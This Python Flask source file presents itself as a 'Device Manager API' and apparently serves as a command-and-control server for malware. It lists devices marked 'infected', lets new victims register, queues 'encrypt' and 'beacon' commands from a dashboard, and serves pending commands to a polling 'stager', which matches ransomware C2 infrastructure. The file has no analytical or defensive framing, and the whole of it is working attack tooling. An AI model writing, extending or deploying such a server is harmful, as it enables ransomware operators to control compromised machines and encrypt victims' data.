from flask import Flask, jsonify, request
import json

app = Flask(__name__)

devices = [
    {'id': '1', 'name': 'Device 1', 'status': 'infected', 'ip': '192.168.1.2'},
    {'id': '2', 'name': 'Device 2', 'status': 'infected', 'ip': '192.168.1.3'},
]

# Command queue: device_id -> command string
commands = {}

@app.route('/')
def index():
    return 'Device Manager API is running.'

@app.route('/devices', methods=['GET', 'POST'])
def handle_devices():
    if request.method == 'POST':
        data = request.get_json()
        if data:
            devices.append({
                'id': data.get('id', 'unknown'),
                'name': data.get('name', 'Unknown'),
                'status': 'infected',
                'ip': data.get('ip', '0.0.0.0')
            })
            return jsonify({'success': True, 'device': data})
        return jsonify({'error': 'Invalid data'}), 400
    return jsonify(devices)

@app.route('/command', methods=['POST'])
def handle_command():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400

    device_id = data.get('deviceId')
    command = data.get('command')

    # If command is provided, store it (dashboard -> server)
    if command:
        commands[device_id] = command
        # Update device status
        for device in devices:
            if device['id'] == device_id:
                if command == 'encrypt':
                    device['status'] = 'encrypting'
                elif command == 'beacon':
                    device['status'] = 'beaconing'
                break
        return jsonify({'success': True, 'message': 'Command stored'})

    # If no command, retrieve pending command for this device (stager -> server)
    pending = commands.get(device_id)
    if pending:
        return jsonify({'command': pending})
    else:
        return jsonify({'command': None})

@app.route('/beacon', methods=['GET', 'POST'])
def beacon():
    return jsonify({'status': 'beacon received'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
